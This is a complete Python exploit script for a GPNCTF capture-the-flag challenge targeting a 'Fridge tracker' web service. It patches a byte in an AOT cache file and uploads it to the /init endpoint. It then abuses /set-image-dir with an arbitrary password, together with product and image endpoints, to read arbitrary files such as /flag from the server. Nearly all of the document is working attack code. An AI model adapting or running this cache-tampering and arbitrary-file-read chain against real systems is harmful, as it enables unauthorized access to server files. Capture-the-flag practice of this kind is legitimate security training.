#!/usr/bin/env python3
from __future__ import annotations

import argparse
import re
import subprocess
import sys
import time
from pathlib import Path

import requests

PATCH_OFF = 0x1F05A88
ORIG = bytes.fromhex('03b81100b0')
PATCHED = bytes.fromhex('04b81100b0')
FLAG_RE = re.compile(r'GPNCTF\{[^}\r\n]+\}')


def product_json(name: str) -> dict:
    return {
        'product': {
            'name': name,
            'quantity': 1,
            'bestBefore': '2026-01-01T00:00:00',
            'notAfter': '2026-01-02T00:00:00',
        },
        'imageUrl': None,
    }


def patch_cache(inp: Path, out: Path) -> None:
    data = bytearray(inp.read_bytes())
    got = bytes(data[PATCH_OFF:PATCH_OFF + len(ORIG)])
    if got == ORIG:
        data[PATCH_OFF] = 0x04
        print(f'[patch] OK: 0x{PATCH_OFF:x}: {ORIG.hex()} -> {PATCHED.hex()}')
    elif got == PATCHED:
        print(f'[patch] cache is already patched at 0x{PATCH_OFF:x}')
    else:
        raise RuntimeError(
            f'unexpected bytes at 0x{PATCH_OFF:x}: {got.hex()} '
            f'(expected {ORIG.hex()} or {PATCHED.hex()})'
        )
    out.write_bytes(data)
    print(f'[patch] wrote {out} ({out.stat().st_size} bytes)')


def request_get(session: requests.Session, url: str, verify: bool, timeout: float = 5.0):
    return session.get(url, verify=verify, timeout=timeout)


def stage2_is_up(session: requests.Session, base: str, verify: bool) -> bool:
    try:
        r = request_get(session, base + '/', verify=verify, timeout=5)
        return r.status_code == 200 and 'Fridge tracker' in r.text
    except requests.RequestException:
        return False


def wait_stage2(session: requests.Session, base: str, verify: bool, timeout_s: float = 180.0) -> None:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        if stage2_is_up(session, base, verify):
            print('[stage2] service is up')
            return
        time.sleep(1.0)
    raise RuntimeError(f'stage2 did not become ready after /init within {timeout_s}s')


def upload_cache_requests(session: requests.Session, base: str, cache_path: Path, verify: bool, timeout_s: float) -> None:
    with cache_path.open('rb') as f:
        r = session.post(
            base + '/init',
            files={'cache.aot': ('cache.aot', f, 'application/octet-stream')},
            verify=verify,
            timeout=timeout_s,
        )
    print(f'[init] HTTP {r.status_code}: {r.text[:160]!r}')


def upload_cache_curl(base: str, cache_path: Path, verify: bool, timeout_s: float) -> None:
    cmd = [
        'curl',
        '--silent', '--show-error', '--location',
        '--max-time', str(int(timeout_s)),
        '-F', f'cache.aot=@{cache_path};type=application/octet-stream',
        base + '/init',
    ]
    if not verify:
        cmd.insert(1, '--insecure')
    print('[init] curl fallback:', ' '.join(cmd))
    cp = subprocess.run(cmd, capture_output=True, text=True)
    if cp.stdout:
        print('[init][curl][stdout]', cp.stdout[:500])
    if cp.stderr:
        print('[init][curl][stderr]', cp.stderr[:500])
    if cp.returncode != 0:
        raise RuntimeError(f'curl upload failed with exit code {cp.returncode}')


def upload_cache(session: requests.Session, base: str, cache_path: Path, verify: bool, timeout_s: float, use_curl: bool) -> None:
    if stage2_is_up(session, base, verify):
        print('[init] target already appears to be stage 2; skipping upload')
        return

    print('[init] uploading patched AOT cache to /init ...')
    try:
        if use_curl:
            upload_cache_curl(base, cache_path, verify, timeout_s)
        else:
            upload_cache_requests(session, base, cache_path, verify, timeout_s)
    except requests.RequestException as e:
        print(f'[init] request ended with {type(e).__name__}: {str(e)[:220]}')
    except Exception as e:
        print(f'[init] upload path raised {type(e).__name__}: {str(e)[:220]}')


def set_image_dir(session: requests.Session, base: str, directory: str, verify: bool) -> bool:
    r = session.post(
        base + '/set-image-dir',
        json={'password': 'anything', 'newPath': directory},
        verify=verify,
        timeout=20,
    )
    print(f'[set-image-dir] {directory!r} -> HTTP {r.status_code} {r.text[:100]!r}')
    return r.status_code == 200


def add_product(session: requests.Session, base: str, name: str, verify: bool) -> bool:
    r = session.put(
        base + f'/products/{name}',
        json=product_json(name),
        verify=verify,
        timeout=20,
    )
    print(f'[put-product] {name!r} -> HTTP {r.status_code} {r.text[:100]!r}')
    return r.status_code == 200


def read_image(session: requests.Session, base: str, name: str, verify: bool) -> str:
    r = session.get(base + f'/images/{name}', verify=verify, timeout=20)
    text = r.text
    print(f'[read-image] {name!r} -> HTTP {r.status_code}, {len(r.content)} bytes')
    print(text[:1000])
    return text


def try_read(session: requests.Session, base: str, directory: str, filename: str, verify: bool) -> str | None:
    if not set_image_dir(session, base, directory, verify):
        return None
    if not add_product(session, base, filename, verify):
        return None
    text = read_image(session, base, filename, verify)
    m = FLAG_RE.search(text)
    if m:
        return m.group(0)
    return None


def exploit(base: str, patched_cache: Path, verify: bool, extra_paths: list[str], upload_timeout_s: float, stage2_timeout_s: float, skip_upload: bool, use_curl: bool) -> str:
    base = base.rstrip('/')
    with requests.Session() as session:
        session.headers.update({'Connection': 'close'})
        if not skip_upload:
            upload_cache(session, base, patched_cache, verify, upload_timeout_s, use_curl)
        else:
            print('[init] skip upload requested')

        wait_stage2(session, base, verify, timeout_s=stage2_timeout_s)

        candidates = ['/flag', '/app/flag', '/challenge/flag', '/home/ctf/flag', '/tmp/flag']
        candidates.extend(extra_paths)

        seen: set[str] = set()
        for full_path in candidates:
            if full_path in seen:
                continue
            seen.add(full_path)
            p = Path(full_path)
            directory = str(p.parent) if str(p.parent) else '/'
            filename = p.name
            print(f'[try] reading {directory}/{filename}')
            try:
                flag = try_read(session, base, directory, filename, verify)
                if flag:
                    print(f'[FLAG] {flag}')
                    return flag
            except requests.RequestException as e:
                print(f'[warn] HTTP error while trying {full_path}: {e}')
            except Exception as e:
                print(f'[warn] error while trying {full_path}: {e}')

    raise RuntimeError('no GPNCTF{...} flag found in tried paths')


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument('--cache', default='cache.aot')
    ap.add_argument('--patched', default='/tmp/patched-cache.aot')
    ap.add_argument('--base')
    ap.add_argument('--no-verify', action='store_true')
    ap.add_argument('--patch-only', action='store_true')
    ap.add_argument('--skip-upload', action='store_true')
    ap.add_argument('--use-curl', action='store_true')
    ap.add_argument('--upload-timeout', type=float, default=900.0)
    ap.add_argument('--stage2-timeout', type=float, default=240.0)
    ap.add_argument('--path', action='append', default=[])
    args = ap.parse_args()

    cache = Path(args.cache)
    patched = Path(args.patched)
    patch_cache(cache, patched)

    if args.patch_only:
        return 0
    if not args.base:
        print('error: --base is required unless --patch-only is used', file=sys.stderr)
        return 2

    flag = exploit(
        args.base,
        patched,
        verify=not args.no_verify,
        extra_paths=args.path,
        upload_timeout_s=args.upload_timeout,
        stage2_timeout_s=args.stage2_timeout,
        skip_upload=args.skip_upload,
        use_curl=args.use_curl,
    )
    print(flag)
    return 0


if __name__ == '__main__':
    raise SystemExit(main())
